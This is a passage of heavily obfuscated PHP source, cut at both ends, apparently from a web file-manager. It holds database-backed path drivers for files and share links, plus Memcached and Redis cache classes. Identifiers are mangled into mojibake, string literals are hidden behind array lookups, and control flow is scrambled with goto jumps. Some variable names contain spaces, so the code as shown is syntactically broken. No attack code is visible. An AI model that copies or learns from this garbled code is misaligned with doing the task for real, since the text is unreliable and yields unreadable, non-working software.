=> !1, $Bæˆ¹“÷¥[1061] => $Bæˆ¹“÷¥[1560]); } $a—Ñ¨İ¥½â = curl_init($B­ùà—¥™); goto D†ÄïäÑêƒ; déã—¦±ëŒ: curl_close($a—Ñ¨İ¥½â); fclose($cˆ‚—ä¡‡à); $fŞïóØîÂ = filesize_64(iconv_system($Dö¥Ø÷¯’î)); goto AÆ¾ïŸ¤; b×†¨ƒâªì: curl_setopt($a—Ñ¨İ¥½â, CURLOPT_NOPROGRESS, !1); curl_setopt($a—Ñ¨İ¥½â, CURLOPT_PROGRESSFUNCTION, $Bæˆ¹“÷¥[1561]); curl_progress_start($a—Ñ¨İ¥½â); goto cÓÛŞò¹Ñ’; d…õÊ…®„: } static function checkGzip($DÇëÙøÀÁê) { goto a­äŸ…šÕÀ; bÉõ‹ÇèØ: file_put_contents($DÇëÙøÀÁê, $EƒÌêß²˜); goto F§ôÍœó; Cù±¦Œ¢È: ob_start(); readgzfile($DÇëÙøÀÁê); $EƒÌêß²˜ = ob_get_clean(); goto bÉõ‹ÇèØ; a­äŸ…šÕÀ: $b¹Œ¡ˆŸÎ® = $_SERVER[åÌÛ»ô¢‚ö™][1564]; $f˜±ïÚÄ” = file_sub_str($DÇëÙøÀÁê, 0, 2); if ($b¹Œ¡ˆŸÎ® != $f˜±ïÚÄ”) { return; } goto Cù±¦Œ¢È; F§ôÍœó: } } goto A’ÙˆÓµÆ•; e´…®êƒÜĞ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($cÎ“ñôÍ‰„) { $this->pathParse = $cÎ“ñôÍ‰„; $this->model = Model($_SERVER[åÌÛ»ô¢‚ö™][1143]); } public function getPath($A¸¡â¬‹˜) { return trim($A¸¡â¬‹˜, $_SERVER[åÌÛ»ô¢‚ö™][8]); } public function pathFather($Eõ‰ÙÉá™æ) { $aì‡Â¶ íÆ = $this->parse($Eõ‰ÙÉá™æ); $aì‡Â¶ íÆ = $this->infoSimple($Eõ‰ÙÉá™æ); return $aì‡Â¶ íÆ ? $aì‡Â¶ íÆ[$_SERVER[åÌÛ»ô¢‚ö™][487]] : !1; } public function getPathName($B°‡®ê…Ì) { $c—å×ÔÎ„ = $this->infoSimple($B°‡®ê…Ì); return $c—å×ÔÎ„ ? $c—å×ÔÎ„[$_SERVER[åÌÛ»ô¢‚ö™][28]] : !1; } public function getPathOuter($CÉÆ¸Ü«•Ç) { if (!$CÉÆ¸Ü«•Ç) { return $CÉÆ¸Ü«•Ç; } $Bß’¦ÔÄ¡Ó = $this->parse($CÉÆ¸Ü«•Ç); return KodIO::make($Bß’¦ÔÄ¡Ó[$_SERVER[åÌÛ»ô¢‚ö™][392]]); } public function copyFolderFromIO($Aïäïâá, $d“á”ÜÓ¼È, $CÂÜÆ¦«…, $D“Û‰Úá‡, $bõ½Ú®¨¦Ä) { $C×ÂÉç¡Ñ = $this->model->copyFolderFromIO($Aïäïâá, $d“á”ÜÓ¼È, $CÂÜÆ¦«…, $D“Û‰Úá‡, $bõ½Ú®¨¦Ä); return KodIO::make($C×ÂÉç¡Ñ); } public function isParentOf($b†Âˆñš‡ï, $D°ê¡’ßõ”) { return $this->model->isParentOf($b†Âˆñš‡ï, $D°ê¡’ßõ”); } public function mkfile($cŸ¥§Ÿ¤›†, $EŞòªŠÛ = '', $CíñÒ¥Ğù¸ = REPEAT_RENAME) { $D‘‡ªÀ =& $_SERVER[åÌÛ»ô¢‚ö™]; $D–ˆ‚ÜŞ•Ê = $this->parse($cŸ¥§Ÿ¤›†); $cŸ¥§Ÿ¤›† = $D–ˆ‚ÜŞ•Ê[$D‘‡ªÀ[392]]; for ($BÇ­Ñª°† = 0; $BÇ­Ñª°† < count($D–ˆ‚ÜŞ•Ê[$D‘‡ªÀ[1144]]); $BÇ­Ñª°†++) { $E¬Ù´äçáò = $D–ˆ‚ÜŞ•Ê[$D‘‡ªÀ[1144]][$BÇ­Ñª°†]; if ($BÇ­Ñª°† == count($D–ˆ‚ÜŞ•Ê[$D‘‡ªÀ[1144]]) - 1) { $cŸ¥§Ÿ¤›† = $this->model->mkfile($cŸ¥§Ÿ¤›†, $E¬Ù´äçáò, $EŞòªŠÛ, $CíñÒ¥Ğù¸); break; } $cŸ¥§Ÿ¤›† = $this->model->mkdir($cŸ¥§Ÿ¤›†, $E¬Ù´äçáò, REPEAT_SKIP); } return $this->getPathOuter($cŸ¥§Ÿ¤›†); } public function mkdir($A¤³‚…¦¯, $A™«ìîŒ = REPEAT_SKIP) { $Eµİ’Š­¸­ =& $_SERVER[åÌÛ»ô¢‚ö™]; $b·øÏÆ§áï = $this->parse($A¤³‚…¦¯); $A¤³‚…¦¯ = $b·øÏÆ§áï[$Eµİ’Š­¸­[392]]; for ($Fİİ³“¿ò‡ = 0; $Fİİ³“¿ò‡ < count($b·øÏÆ§áï[$Eµİ’Š­¸­[1144]]); $Fİİ³“¿ò‡++) { $eÔ™Ÿ„²£ = $b·øÏÆ§áï[$Eµİ’Š­¸­[1144]][$Fİİ³“¿ò‡]; $A¤³‚…¦¯ = $this->model->mkdir($A¤³‚…¦¯, $eÔ™Ÿ„²£, $A™«ìîŒ); } return $this->getPathOuter($A¤³‚…¦¯); } public function copyFile($fŒŒ‡¾‹¶Í, $c¤§ˆÍÈòÉ, $díœñ£ä¯Ü = REPEAT_REPLACE) { $BÙŒòÄö¨– =& $_SERVER[åÌÛ»ô¢‚ö™]; $Fâ­§º»¼‡ = $this->parse($c¤§ˆÍÈòÉ); $cÈ¸ÒËƒÖ = $this->model->copy($fŒŒ‡¾‹¶Í, $Fâ­§º»¼‡[$BÙŒòÄö¨–[392]], $díœñ£ä¯Ü, $Fâ­§º»¼‡[$BÙŒòÄö¨–[75]]); return $cÈ¸ÒËƒÖ ? $this->getPathOuter($cÈ¸ÒËƒÖ) : !1; } public function moveFile($b§°ë”‚²¨, $A×İÃ×Ã—ˆ, $Fåë¥åŒØ‘ = REPEAT_REPLACE) { $B“ºäæÙÓ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FŒƒõØ¹¢‘ = $this->parse($A×İÃ×Ã—ˆ); $C‚ˆº´í­Ø = $this->model->move($b§°ë”‚²¨, $FŒƒõØ¹¢‘[$B“ºäæÙÓ[392]], $Fåë¥åŒØ‘, $FŒƒõØ¹¢‘[$B“ºäæÙÓ[75]]); return $C‚ˆº´í­Ø ? $this->getPathOuter($C‚ˆº´í­Ø) : !1; } public function copy($e½××ÉÍ˜‚, $f…Å¬Ã§š, $AĞÄÕØíäî = REPEAT_REPLACE) { $DÒáœãÒŞä = $this->parse($f…Å¬Ã§š); $bæÚÊèÛØƒ = $this->model->copy($e½××ÉÍ˜‚, $DÒáœãÒŞä[$_SERVER[åÌÛ»ô¢‚ö™][392]], $AĞÄÕØíäî); return $bæÚÊèÛØƒ ? $this->getPathOuter($bæÚÊèÛØƒ) : !1; } public function moveSameAllow() { } public function move($e½å¦Ÿ’ˆµ, $eÈƒÅºŠÑ¡, $fÁ‹‚ÏšØŒ = REPEAT_REPLACE) { $eœÛ¨ÜÒç = $this->parse($eÈƒÅºŠÑ¡); $aÔ©¢°™á¦ = $this->model->move($e½å¦Ÿ’ˆµ, $eœÛ¨ÜÒç[$_SERVER[åÌÛ»ô¢‚ö™][392]], $fÁ‹‚ÏšØŒ); return $aÔ©¢°™á¦ ? $this->getPathOuter($aÔ©¢°™á¦) : !1; } public function remove($FÎ¸ÎˆÁğ×, $Bõ‚ƒŞó”á = true) { return $this->model->remove($FÎ¸ÎˆÁğ×, $Bõ‚ƒŞó”á); } public function rename($fƒÎ½ùÖ, $f’™É«õñ) { $c…Ü‰˜ªº· = $this->model->rename($fƒÎ½ùÖ, $f’™É«õñ); return $c…Ü‰˜ªº· ? $this->getPathOuter($fƒÎ½ùÖ) : $c…Ü‰˜ªº·; } public function size($B¦ÈŒàÌ) { $E”ò·È¸ = $this->infoSimple($B¦ÈŒàÌ); return $E”ò·È¸ ? $E”ò·È¸[$_SERVER[åÌÛ»ô¢‚ö™][77]] : 0; } public function infoSimple($C“ÄëêäóĞ) { return $this->model->sourceInfo($C“ÄëêäóĞ); } public function info($aÅ˜‹‡«»¯) { return $this->infoParse($aÅ˜‹‡«»¯); } public function infoAuth($Dë¹¥°¼ŠÎ) { return $this->infoParse($Dë¹¥°¼ŠÎ, !1, !0); } public function infoWithChildren($A„•ãÜõóò) { return $this->infoParse($A„•ãÜõóò, !0); } protected function infoParse($CÜ…ğÍ¬Ú, $DÍ»Ø‰ŞÇÉ = false, $CÕÔÑêí‰Ü = false) { if (!$DÍ»Ø‰ŞÇÉ) { return $this->model->pathInfo($CÜ…ğÍ¬Ú, $CÕÔÑêí‰Ü); } return $this->model->pathInfoMore($CÜ…ğÍ¬Ú); } public function infoFull($E‡½ŠÕ‡¸š) { $CÀò­Ç©«Å =& $_SERVER[åÌÛ»ô¢‚ö™]; $F“Ï†¥Èœ = explode($CÀò­Ç©«Å[8], $E‡½ŠÕ‡¸š); $bî÷®¯Óï’ = implode($CÀò­Ç©«Å[8], array_splice($F“Ï†¥Èœ, 1)); return $this->model->pathInfoByPath($F“Ï†¥Èœ[0], $bî÷®¯Óï’); } public function hashSimple($EêÜ¸‹ÈÍö) { $AßÓÆ„äéÉ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CˆäŠ‹©”¨ = $this->infoWithChildren($EêÜ¸‹ÈÍö); return $CˆäŠ‹©”¨[$AßÓÆ„äéÉ[161]][$AßÓÆ„äéÉ[168]]; } public function hashMd5($c¡Ê£œ˜š) { $c…ÈÆ«ÊëÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $e‹çßåîêµ = $this->infoWithChildren($c¡Ê£œ˜š); return $e‹çßåîêµ[$c…ÈÆ«ÊëÒ[161]][$c…ÈÆ«ÊëÒ[167]]; } public function exist($f™‹¯öäÎ) { $eğ¼Øµã¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; $AÙ±â¾‡èô = $this->parse($f™‹¯öäÎ); if (!$AÙ±â¾‡èô[$eğ¼Øµã¦[75]]) { return $this->isFile($f™‹¯öäÎ) || $this->isFolder($f™‹¯öäÎ); } $aªÒâ™ÉõÓ = array($eğ¼Øµã¦[393] => $AÙ±â¾‡èô[$eğ¼Øµã¦[392]], $eğ¼Øµã¦[28] => $AÙ±â¾‡èô[$eğ¼Øµã¦[75]]); $c¹Èê¬àÎ¼ = $this->model->where($aªÒâ™ÉõÓ)->find(); return $c¹Èê¬àÎ¼ ? !0 : !1; } public function isFile($CãŒ®Û¾ò) { $B¨„£Íª÷° =& $_SERVER[åÌÛ»ô¢‚ö™]; $E°œ°µ¹¾¦ = $this->infoSimple($CãŒ®Û¾ò); return $E°œ°µ¹¾¦ && $E°œ°µ¹¾¦[$B¨„£Íª÷°[395]] == $B¨„£Íª÷°[83] ? !1 : !0; } public function isFolder($DŸ›×ùïŠÔ) { $E…êÅÍñµ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FñØƒò–‰† = $this->infoSimple($DŸ›×ùïŠÔ); return $FñØƒò–‰† && $FñØƒò–‰†[$E…êÅÍñµ[395]] == $E…êÅÍñµ[83] ? !0 : !1; } public function listPath($A¼Ùƒ„Û, $Aòâ¸Ğ¸®² = false) { $A©Ú¢¶ã®³ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($A¼Ùƒ„Û == $A©Ú¢¶ã®³[33]) { return !1; } $bİ®«âÀ¯ê = array($A©Ú¢¶ã®³[393] => $A¼Ùƒ„Û); if ($Aòâ¸Ğ¸®²) { return $this->model->listSource($bİ®«âÀ¯ê, -1); } return $this->model->listSource($bİ®«âÀ¯ê); } public function has($E—ğƒõÒ¹³, $d­ğ‚éìÊÊ = false, $cã¹¦Ä Ø = null) { $fŸÈáÇ´¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BùïÚ¢Äî‚ = $this->infoWithChildren($E—ğƒõÒ¹³); if ($d­ğ‚éìÊÊ) { return array($fŸÈáÇ´¡[210] => $BùïÚ¢Äî‚[$fŸÈáÇ´¡[210]], $fŸÈáÇ´¡[209] => $BùïÚ¢Äî‚[$fŸÈáÇ´¡[209]]); } return $cã¹¦Ä Ø ? $BùïÚ¢Äî‚[$fŸÈáÇ´¡[210]] : $BùïÚ¢Äî‚[$fŸÈáÇ´¡[209]]; } public function listAll($DÕ÷——¤Ğ²) { $cÚ¹ã†½‘Å = IO::info($this->pathParse[$_SERVER[åÌÛ»ô¢‚ö™][75]]); if (!$cÚ¹ã†½‘Å) { return array(); } return $this->model->listAll($DÕ÷——¤Ğ²); } public function getContent($EöĞ»‹ëîÏ) { return $this->model->getContent($EöĞ»‹ëîÏ); } public function setContent($cğµ¹°©¿¤, $aè¢ÖŒ†Şê = '') { return $this->model->setContent($cğµ¹°©¿¤, $aè¢ÖŒ†Şê); } public function fileSubstr($D‚ªÚŞÀõô, $A¸µš¿èòğ, $a¿ô©ì°ß…) { return $this->model->fileSubstr($D‚ªÚŞÀõô, $A¸µš¿èòğ, $a¿ô©ì°ß…); } public function download($Aô‚éµ£ù, $Aµ°Õ¿ßÁ‰ = '') { $eî‡µêä…‹ = get_path_father($Aµ°Õ¿ßÁ‰); $e•äÕğ‚†§ = get_path_this($Aµ°Õ¿ßÁ‰); $Aåà‚ã“Û‰ = $this->model->fileInfoGet($Aô‚éµ£ù); $c¬¨½¸³¨Ø = IO::copy($Aåà‚ã“Û‰[$_SERVER[åÌÛ»ô¢‚ö™][75]], $eî‡µêä…‹, !1, $e•äÕğ‚†§); return $c¬¨½¸³¨Ø; } public function setModifyTime($f²»šà¦Ãğ, $FœÙŠÆŠ¾ì = '') { $this->model->metaSet($f²»šà¦Ãğ, $_SERVER[åÌÛ»ô¢‚ö™][1145], $FœÙŠÆŠ¾ì); } public function upload($C¼İ—½èÅê, $F¤„öø¶ñ, $CœÕ­Æ‚à— = false, $fè†“ÌßÏ = REPEAT_REPLACE) { $eÚ­´á¤ò° =& $_SERVER[åÌÛ»ô¢‚ö™]; $cœŠ†ïŒ¼É = $this->parse($C¼İ—½èÅê); $DåƒÚßœ° = $this->model->addFile($cœŠ†ïŒ¼É[$eÚ­´á¤ò°[392]], $F¤„öø¶ñ, $cœŠ†ïŒ¼É[$eÚ­´á¤ò°[75]], $CœÕ­Æ‚à—, $fè†“ÌßÏ); return $this->getPathOuter($DåƒÚßœ°); } public function uploadFileByID($FÑÀ¤¯¨ë°, $a©ÀÜ Ü­¤, $B¹÷èåò°«) { $FïÕã†‡Ø =& $_SERVER[åÌÛ»ô¢‚ö™]; $d³–¶©‹Ç± = $this->parse($FÑÀ¤¯¨ë°); $F¶‡Èƒ†Šë = $this->model->addFileByFileID($d³–¶©‹Ç±[$FïÕã†‡Ø[392]], $a©ÀÜ Ü­¤, $d³–¶©‹Ç±[$FïÕã†‡Ø[75]], $B¹÷èåò°«); return $this->getPathOuter($F¶‡Èƒ†Šë); } public function addFileByRemote($AÇÖÒÁ„, $cÍ¨â‡¬Æ, $céÓ•ÖÖªÔ = array(), $fÂ²†Ëò = '', $fèÂÄôŠŞ ) { $C²¯ˆ†‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bà—•á–‘é = $this->parse($AÇÖÒÁ„); $fÂ²†Ëò = empty($fÂ²†Ëò) ? $bà—•á–‘é[$C²¯ˆ†‰[75]] : $fÂ²†Ëò; $cæÒœ¢‡õ = $this->model->addFileByRemote($bà—•á–‘é[$C²¯ˆ†‰[392]], $cÍ¨â‡¬Æ, $fÂ²†Ëò, $céÓ•ÖÖªÔ, $fèÂÄôŠŞ ); return $this->getPathOuter($cæÒœ¢‡õ); } public function uploadLink($e—é¨·ˆÉ±, $AîÅª“³³  = 0) { $Fàªåä£¶ù =& $_SERVER[åÌÛ»ô¢‚ö™]; $fä³éá¿”ö = $this->parse($e—é¨·ˆÉ±); $e—é¨·ˆÉ± = Model($Fàªåä£¶ù[569])->createFileName($fä³éá¿”ö[$Fàªåä£¶ù[75]]); $aÂ³“™óùÅ = IO::uploadLink($e—é¨·ˆÉ±, $AîÅª“³³ ); return $aÂ³“™óùÅ; } public function fileNameAuto($Fö¸°¤ÍŞ§, $C¸Á¿Ë¶‹Ë, $E†êä×¨®· = REPEAT_REPLACE, $aÜÅÚğñ¹ç = false) { return $this->model->fileNameAuto($Fö¸°¤ÍŞ§, $C¸Á¿Ë¶‹Ë, $E†êä×¨®·, $aÜÅÚğñ¹ç); } public function fileNameExist($D‘ƒ¢ù—‘Ñ, $EÇ¹Ğ×Øô) { return $this->model->fileNameExist($D‘ƒ¢ù—‘Ñ, $EÇ¹Ğ×Øô); } protected function _fileOut($Aø¿Ñ­šÏ, $aÕèÌä‰ù± = false, $c³îÏáÁÉ = false, $Aá“‹Ö¦Ÿ = '', $F®Ğ¨ŒˆÍ = false) { goto aÓ¶¨ ­¨ƒ; EÈÀ”ëïÂĞ: $A“ßöÛÏÇ = $this->model->fileInfoGet($Aø¿Ñ­šÏ); $Aá“‹Ö¦Ÿ = $A“ßöÛÏÇ[$E±˜±Â[167]] ? $A“ßöÛÏÇ[$E±˜±Â[167]] : $Aá“‹Ö¦Ÿ; $aß¿ÊÙ›¡Ï = isset($GLOBALS[$E±˜±Â[1147]]) ? $GLOBALS[$E±˜±Â[1147]] : $EÈäÆäÅ«¿[$E±˜±Â[28]]; goto fë‡¬…Æ¤°; aÓ¶¨ ­¨ƒ: $E±˜±Â =& $_SERVER[åÌÛ»ô¢‚ö™]; $EÈäÆäÅ«¿ = $this->model->sourceInfo($Aø¿Ñ­šÏ); if ($EÈäÆäÅ«¿[$E±˜±Â[395]] == $E±˜±Â[83]) { header($E±˜±Â[1146]); die; } goto EÈÀ”ëïÂĞ; fë‡¬…Æ¤°: if ($F®Ğ¨ŒˆÍ) { return IO::fileOutServer($A“ßöÛÏÇ[$E±˜±Â[75]], $aÕèÌä‰ù±, $aß¿ÊÙ›¡Ï, $Aá“‹Ö¦Ÿ); } IO::fileOut($A“ßöÛÏÇ[$E±˜±Â[75]], $aÕèÌä‰ù±, $aß¿ÊÙ›¡Ï, $Aá“‹Ö¦Ÿ); goto d³Î“ƒÌÆ; d³Î“ƒÌÆ: } public function fileOut($c‡­±‚§², $FçêÒã¢åÏ = false, $aÑÑ„´Æë = false, $d‘‡©¹…³Ô = '') { $this->_fileOut($c‡­±‚§², $FçêÒã¢åÏ, $aÑÑ„´Æë, $d‘‡©¹…³Ô); } public function fileOutServer($D°Ñ—£Ç¤, $a‰ê‚øíÁ‹ = false, $b§³ªŞ–™ = false, $f‰Êøö¤À = '') { $this->_fileOut($D°Ñ—£Ç¤, $a‰ê‚øíÁ‹, $b§³ªŞ–™, $f‰Êøö¤À, !0); } protected function _fileOutImage($ağ’ëÅŞ¿, $eµ¶¼Ü«ë = 250) { goto f‡Íì²¸‰È; f‡Íì²¸‰È: $Eç®¿Ş”‰„ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÔì¼¬‡šõ = $this->model->pathInfo($ağ’ëÅŞ¿); if ($bÔì¼¬‡šõ[$Eç®¿Ş”‰„[395]] == $Eç®¿Ş”‰„[83]) { show_json($Eç®¿Ş”‰„[1148] . $ağ’ëÅŞ¿, !1); } goto d§¿âØŸØ¿; d§¿âØŸØ¿: $aÒÅë¾±É± = $this->model->fileInfoGet($ağ’ëÅŞ¿); $aÒÅë¾±É±[$Eç®¿Ş”‰„[28]] = $bÔì¼¬‡šõ[$Eç®¿Ş”‰„[28]]; $aÒÅë¾±É±[$Eç®¿Ş”‰„[160]] = $bÔì¼¬‡šõ[$Eç®¿Ş”‰„[160]]; goto aÛµ¤ÅØøŞ; aÛµ¤ÅØøŞ: $GLOBALS[$Eç®¿Ş”‰„[1147]] = $aÒÅë¾±É±[$Eç®¿Ş”‰„[28]]; $GLOBALS[$Eç®¿Ş”‰„[159]] = $aÒÅë¾±É±; IO::fileOutImage($aÒÅë¾±É±[$Eç®¿Ş”‰„[75]], $eµ¶¼Ü«ë); goto D¢’ÁÌ›†Ø; D¢’ÁÌ›†Ø: } public function fileOutImage($C§ÛïØÕÛ, $E·³ò‹‹£ = 250) { $this->_fileOutImage($C§ÛïØÕÛ, $E·³ò‹‹£); } public function fileOutImageServer($bªÉä®¡„, $Fš °˜¹¥÷ = 250) { $this->_fileOutImage($bªÉä®¡„, $Fš °˜¹¥÷); } public function link($Aè¥‹¥©óÛ, $C¾²ô¼Ïñ = '') { $B†¹¥¾Ç‹ = $this->model->fileInfoGet($Aè¥‹¥©óÛ); return IO::link($B†¹¥¾Ç‹[$_SERVER[åÌÛ»ô¢‚ö™][75]], $C¾²ô¼Ïñ); } protected function parse($Aù™˜Ç×Û‚) { $F§Ä¶Ûáİè =& $_SERVER[åÌÛ»ô¢‚ö™]; if (strstr($Aù™˜Ç×Û‚, $F§Ä¶Ûáİè[8]) === !1) { return array($F§Ä¶Ûáİè[410] => intval($Aù™˜Ç×Û‚), $F§Ä¶Ûáİè[75] => $F§Ä¶Ûáİè[33], $F§Ä¶Ûáİè[1144] => array()); } $c„ÀóŸÈ‚œ = explode($F§Ä¶Ûáİè[8], trim($Aù™˜Ç×Û‚, $F§Ä¶Ûáİè[8])); if (count($c„ÀóŸÈ‚œ) < 2) { show_tips($Aù™˜Ç×Û‚ . $F§Ä¶Ûáİè[1149]); } return array($F§Ä¶Ûáİè[410] => intval($c„ÀóŸÈ‚œ[0]), $F§Ä¶Ûáİè[75] => $c„ÀóŸÈ‚œ[1], $F§Ä¶Ûáİè[1144] => array_slice($c„ÀóŸÈ‚œ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($a’àÜÑ„í) { $this->pathParse = $a’àÜÑ„í; $this->model = Model($_SERVER[åÌÛ»ô¢‚ö™][1143]); } public function getPathOuter($DÕÉĞàÌî‹) { $a³¸‹îØŠ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$DÕÉĞàÌî‹) { return $DÕÉĞàÌî‹; } $DŒïôÉ¢òÀ = $this->parse($DÕÉĞàÌî‹); return trim(KodIO::makeShare($this->pathParse[$a³¸‹îØŠ[392]], $DŒïôÉ¢òÀ[$a³¸‹îØŠ[392]]), $a³¸‹îØŠ[8]); } protected function infoParse($D³ªˆÏøŞñ, $bîîìï†—‰ = false, $eÁó”’â– = false) { $Fù–ë‚íóÒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $EŞ•¹åª = $this->pathParse[$Fù–ë‚íóÒ[392]]; $AáÅ“ëƒàÒ = trim($this->pathParse[$Fù–ë‚íóÒ[1039]], $Fù–ë‚íóÒ[8]); return Action($Fù–ë‚íóÒ[1150])->sharePathInfo($EŞ•¹åª, $AáÅ“ëƒàÒ); } public function infoFull($D²ãŒ‡Ó—) { $dƒš“Éã—§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÏÙŞî´è× = explode($dƒš“Éã—§[8], trim($D²ãŒ‡Ó—, $dƒš“Éã—§[8])); if (count($BÏÙŞî´è×) > 1) { $B‹¯Õ…‚‘ = implode($dƒš“Éã—§[8], array_splice($BÏÙŞî´è×, 1)); $DÒŞËÔ×¤° = $this->model->pathInfoByPath($BÏÙŞî´è×[0], $B‹¯Õ…‚‘); if (!$DÒŞËÔ×¤°) { return !1; } $this->pathParse[$dƒš“Éã—§[1039]] = $DÒŞËÔ×¤°[$dƒš“Éã—§[394]]; } return $this->infoParse($D²ãŒ‡Ó—); } public function listAll($Fó²ÆØÓ¸¤) { goto Fù˜©·ª; Fù˜©·ª: $Eã½”°¯ =& $_SERVER[åÌÛ»ô¢‚ö™]; $BÎéª¿µğà = IO::info($this->pathParse[$Eã½”°¯[75]]); if (!$BÎéª¿µğà) { return array(); } goto EƒÙôº¡±Õ; EƒÙôº¡±Õ: $Cİ’„®ÜŠ¤ = $this->model->listAll($Fó²ÆØÓ¸¤); $fŞÒï˜Õ­ = Model($Eã½”°¯[561])->getInfo($BÎéª¿µğà[$Eã½”°¯[465]]); $BÁ—·òÈšø = Action($Eã½”°¯[1150]); goto c»±§ùÕŞ³; c»±§ùÕŞ³: foreach ($Cİ’„®ÜŠ¤ as &$B„ÄÁ ñ¦ø) { check_abort(); $B„ÄÁ ñ¦ø[$Eã½”°¯[416]] = $BÁ—·òÈšø->_shareItemeParse($B„ÄÁ ñ¦ø[$Eã½”°¯[416]], $fŞÒï˜Õ­); } unset($B„ÄÁ ñ¦ø); return $Cİ’„®ÜŠ¤; goto b‡½„§¤½á; b‡½„§¤½á: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($d§øËÒğÑ) { $this->pathParse = $d§øËÒğÑ; $this->model = Model($_SERVER[åÌÛ»ô¢‚ö™][1143]); } protected function infoParse($B²‹ßèÎÊš, $eœ‹øÚíÄ = false, $Fîğ‘Ï ª¬ = false) { $c ô‡ƒÀè˜ =& $_SERVER[åÌÛ»ô¢‚ö™]; return Action($c ô‡ƒÀè˜[1045])->sharePathInfo($this->pathParse[$c ô‡ƒÀè˜[75]], !0); } public function listPath($C­ÉÖ¡ëÆ, $bğ²³¶…äÕ = false) { $D‚ŒÛõ©¿ =& $_SERVER[åÌÛ»ô¢‚ö™]; $A’¢à—íã¹ = parent::listPath($C­ÉÖ¡ëÆ, $bğ²³¶…äÕ); foreach ($A’¢à—íã¹ as $båÁÄ¹œä¯ => $e‰¯½·¿à°) { if (!in_array($båÁÄ¹œä¯, array($D‚ŒÛõ©¿[73], $D‚ŒÛõ©¿[74]))) { continue; } foreach ($e‰¯½·¿à° as $f™Ò¢ÆëÈ• => $E»±ô³«¿Á) { $A’¢à—íã¹[$båÁÄ¹œä¯][$f™Ò¢ÆëÈ•] = Action($D‚ŒÛõ©¿[1045])->shareItemInfo($E»±ô³«¿Á); } } return $A’¢à—íã¹; } public function listAll($Fˆñ¤ÒÉ½) { goto fø’Œ¥—õø; b¦Œ·ÙÍŒÁ: return $CëØ©Ğ´”; goto d™´ÓÃŞ«; fø’Œ¥—õø: $b¸–Óö‹”¾ =& $_SERVER[åÌÛ»ô¢‚ö™]; $CÙÌ®‡†£• = IO::info($this->pathParse[$b¸–Óö‹”¾[75]]); if (!$CÙÌ®‡†£•) { return array(); } goto dò›öàÏ¥ø; dò›öàÏ¥ø: $CëØ©Ğ´” = $this->model->listAll($Fˆñ¤ÒÉ½); foreach ($CëØ©Ğ´” as &$B‚İ²âæÑÖ) { $B‚İ²âæÑÖ[$b¸–Óö‹”¾[416]] = Action($b¸–Óö‹”¾[1045])->shareItemInfo($B‚İ²âæÑÖ[$b¸–Óö‹”¾[416]]); } unset($B‚İ²âæÑÖ); goto b¦Œ·ÙÍŒÁ; d™´ÓÃŞ«: } } goto CµêÆÊÖ‹Ä; Aìó½à¤æÕ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($F ÆÛĞô–©, $D«ÊäÊ®„) { $FóÔî–•…È =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!class_exists($FóÔî–•…È[807])) { show_json($FóÔî–•…È[808], !1); } $this->cacheTime = $D«ÊäÊ®„; $this->handle = new Memcached(); if (is_array($F ÆÛĞô–©[$FóÔî–•…È[809]]) && count($F ÆÛĞô–©[$FóÔî–•…È[809]]) >= 1) { foreach ($F ÆÛĞô–©[$FóÔî–•…È[809]] as $DÆ‡†‡é‰£) { $BÉõî†ïŠ = explode($FóÔî–•…È[4], $DÆ‡†‡é‰£); $this->handle->addServer($BÉõî†ïŠ[0], $BÉõî†ïŠ[1]); } } else { $this->handle->addServer($F ÆÛĞô–©[$FóÔî–•…È[173]], $F ÆÛĞô–©[$FóÔî–•…È[174]]); } } public function set($bä™Úì÷›À, $cÕğ®‹¨±°, $E—‘µå¶ë· = false) { $E—‘µå¶ë· = $E—‘µå¶ë· ? $E—‘µå¶ë· : $this->cacheTime; return $this->handle->set($bä™Úì÷›À, $cÕğ®‹¨±°, $E—‘µå¶ë·); } public function get($d³†í–•ó) { return $this->handle->get($d³†í–•ó); } public function remove($d»¾ê¼ÎÒÓ) { return $this->handle->delete($d»¾ê¼ÎÒÓ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($CÎ³ëæ£ã, $b‡ŸšÔö©) { $EÏñùá¶¡ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!class_exists($EÏñùá¶¡[810])) { show_json($EÏñùá¶¡[811], !1); } $this->cacheTime = $b‡ŸšÔö©; $cĞìÒõ˜¥„ = isset($CÎ³ëæ£ã[$EÏñùá¶¡[812]]) ? $CÎ³ëæ£ã[$EÏñùá¶¡[812]] : 10; $EÓæ‰Øˆ‡ = _get($CÎ³ëæ£ã, $EÏñùá¶¡[809]); if ($EÓæ‰Øˆ‡ && is_array($EÓæ‰Øˆ‡)) { $this->initCluster($CÎ³ëæ£ã, $cĞìÒõ˜¥„); } else { $this->handle = $this->init($CÎ³ëæ£ã, $cĞìÒõ˜¥„); } } private function init($cˆ“¥‘°†, $dŞ¹Œ‰æ¸â) { $fÍ†ÂÊÎ¡è =& $_SERVER[åÌÛ»ô¢‚ö™]; $E‘Ä•Òß¦ = new Redis(); $A³°–ØÑ¿Ş = isset($cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[813]]) ? $cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[813]] : !1; if ($A³°–ØÑ¿Ş) { $E‘Ä•Òß¦->pconnect($cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[173]], $cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[174]], $dŞ¹Œ‰æ¸â); } else { $E‘Ä•Òß¦->connect($cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[173]], $cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[174]], $dŞ¹Œ‰æ¸â); } if 